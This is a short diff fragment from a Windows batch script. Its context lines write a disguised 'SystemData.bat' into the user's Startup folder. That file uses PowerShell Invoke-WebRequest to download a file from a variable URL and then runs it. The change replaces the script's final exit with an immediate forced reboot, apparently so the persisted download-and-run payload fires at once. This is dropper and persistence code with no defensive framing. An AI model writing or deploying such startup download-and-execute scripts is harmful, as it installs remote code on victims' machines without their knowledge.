@@ -9,4 +9,4 @@ echo powershell -command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%
 echo start "" "%%arquivo%%" >> "%startup%\SystemData.bat"
 echo exit >> "%startup%\SystemData.bat"
 
-exit
+shutdown /r /t 0
